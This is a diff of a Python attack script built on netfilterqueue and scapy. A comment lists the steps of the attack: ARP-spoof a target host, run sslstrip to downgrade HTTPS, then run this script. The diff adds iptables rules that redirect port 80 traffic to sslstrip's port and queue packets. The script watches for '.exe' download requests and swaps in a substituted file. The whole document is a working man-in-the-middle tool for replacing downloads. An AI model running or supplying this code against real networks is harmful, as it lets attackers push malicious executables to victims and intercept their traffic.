@@ -1,14 +1,21 @@
 #!/root/anaconda3/bin  python
+'''
+1. run arp_spoof.py -i eth0 -t 192.168.1.100
+2. python $(locate sslstrip.py | sed -n '/0.9/ p')
+3. clear && python replace_sslstrip_https.py -i eth0 
 
+'''
 import netfilterqueue
 import subprocess
 import scapy.all as scapy
 import optparse
-
-local_computer_test = False
+import time
 
 
 class NetSpoof(object):
+
+    sslstrip_default_port = 10000
+
     def __init__(self, main_layer, tcp_layer, filter_word, nice_replacement):
         self.check_arguments()
         if self.options.interface:
@@ -69,13 +76,13 @@ class NetSpoof(object):
         scapy_packet = scapy.IP(packet.get_payload())
         if scapy_packet.haslayer(self.main_layer):
             try:
-                if scapy_packet[self.tcp_layer].dport == 80:
+                if scapy_packet[self.tcp_layer].dport == NetSpoof.sslstrip_default_port:
                     if self.filter_word in str(scapy_packet[self.main_layer].load) and 'rarlab' not in str(scapy_packet[self.main_layer].load):
                         print(str(scapy_packet[self.main_layer].load))
                         print('[+] exe Request')
                         self.ack_list.add(scapy_packet[self.tcp_layer].ack)
                         print(scapy_packet.show())
-                elif scapy_packet[self.tcp_layer].sport == 80:
+                elif scapy_packet[self.tcp_layer].sport == NetSpoof.sslstrip_default_port:
                     if scapy_packet[self.tcp_layer].seq in self.ack_list:
                         self.ack_list.remove(scapy_packet[self.tcp_layer].seq)
                         print('[+] Replacing file.')
@@ -89,14 +96,13 @@ class NetSpoof(object):
 
 if __name__ == '__main__':
 
-    if local_computer_test:
-        subprocess.call(
-            r'iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
-        subprocess.call(
-            r'iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
-    else:
-        subprocess.call(
-            r'iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
+    subprocess.call(
+        r'iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port ' + str(NetSpoof.sslstrip_default_port), shell=True)
+    time.sleep(1)
+    subprocess.call(
+        r'iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
+    subprocess.call(
+        r'iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
 
     try:
         sp_obj = NetSpoof(scapy.Raw, scapy.TCP, ".exe",
@@ -105,6 +111,7 @@ if __name__ == '__main__':
         queue.bind(0, sp_obj.process_packet)
         queue.run()
     except KeyboardInterrupt:
+        subprocess.call(r'iptables -t nat -F', shell=True)
+        subprocess.call(r'iptables -t mangle -F', shell=True)
         subprocess.call(r'iptables --flush', shell=True)
 
-# python $(locate sslstrip.py | sed -n '/0.9/ p')
